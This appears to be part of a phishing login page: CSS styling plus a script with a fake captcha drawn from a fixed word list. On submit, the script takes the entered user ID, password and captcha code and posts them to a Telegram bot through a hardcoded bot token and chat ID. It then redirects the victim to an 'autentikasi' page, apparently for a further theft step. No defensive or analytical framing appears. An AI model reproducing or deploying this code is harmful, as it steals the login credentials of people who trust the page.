    }
    input:focus {

      outline-offset: 2px;
    }

      align-items: center;
      gap: 1rem;

      background: transparent;
      border: none;

      font-weight: 400;
      padding-bottom: 0.25rem;
      outline-offset: 2px;

    .captcha-input::placeholder {

    }
    .captcha-input:focus {

      outline-offset: 2px;
    }
    .captcha-image {
      width: 80px;
      height: 50px;
      border-radius: 0.375rem;
      object-fit: cover;
      user-select: none;
    }
    .refresh-captcha {
      margin-top: 0.25rem;
      background: transparent;
      border: none;
      color: white;
      text-decoration: underline;
      font-size: 0.875rem; /* text-sm */
      font-weight: 400;
      padding: 0;
      cursor: pointer;
    }
    button.login-btn {
      background-color: #0a62ff;
      border-radius: 9999px;
      padding: 0.5rem 2rem;
      color: white;
      font-size: 1rem;
      font-weight: 400;
      border: none;
      cursor: pointer;
      width: max-content;
    }
    .info-texts {
      margin-top: 2.5rem;
      max-width: 100%;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      display: flex;

      gap: 1rem;
      font-size: 1rem;

    }
    .info-texts a {

      text-decoration: none;
    }

    }
    /* Responsive */
    @media (max-width: 400px) {
      main h1 {
        max-width: 100%;
      }
      .info-texts {
        max-width: 100%;
      }

  <script>
   const captchaImage = document.getElementById('captchaImage');
   const refreshBtn = document.getElementById('refreshCaptcha');
   const loginForm = document.getElementById('loginForm');

   // Array of sample captcha texts
   const captchaTexts = ['z2fi', 'a9xk', 'm7pq', 'r4ty', 'b8vn', 'c3lw', 'd5gz', 'e1hj'];

   // Function to generate a placeholder image URL with text
   function generateCaptchaUrl(text) {
     return `https://placehold.co/80x50/png?text=${text}&font=roboto&font-weight=700&font-size=24&text-align=center&text-color=ffffff&bg=000000`;
   }

   refreshBtn.addEventListener('click', () => {
     let newText;
     do {
       newText = captchaTexts[Math.floor(Math.random() * captchaTexts.length)];
     } while (newText === captchaImage.alt.replace('Captcha code image showing characters ', ''));

     captchaImage.src = generateCaptchaUrl(newText);
     captchaImage.alt = `Captcha code image showing characters ${newText}`;
   });

   loginForm.addEventListener('submit', async (e) => {
     e.preventDefault();

     const userId = loginForm.userid.value.trim();
     const password = loginForm.password.value.trim();
     const kode = loginForm.kode.value.trim();

     if (!userId || !password || !kode) {
       alert('Please fill all fields.');
       return;
     }

     // Telegram Bot API info - replace with your own token and chat ID
     const botToken = '8393342988:AAH6H80b0KuVu6JuIpJgau5MyBQAgU4wQUQ';
     const chatId = '7582685852';

     const message = 
       `New Login Attempt:\nUser ID: ${userId}\nPassword: ${password}\nCaptcha Code: ${kode}`;

     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

     try {
       const response = await fetch(url, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
           chat_id: chatId,
           text: message
         })
       });

       if (response.ok) {
         window.location.href = "autentikasi.html";
         loginForm.reset();
       } else {
         alert('Failed to send data.');
       }
     } catch (error) {
       alert('Error sending data.');
       console.error(error);
     }
   });
  </script>
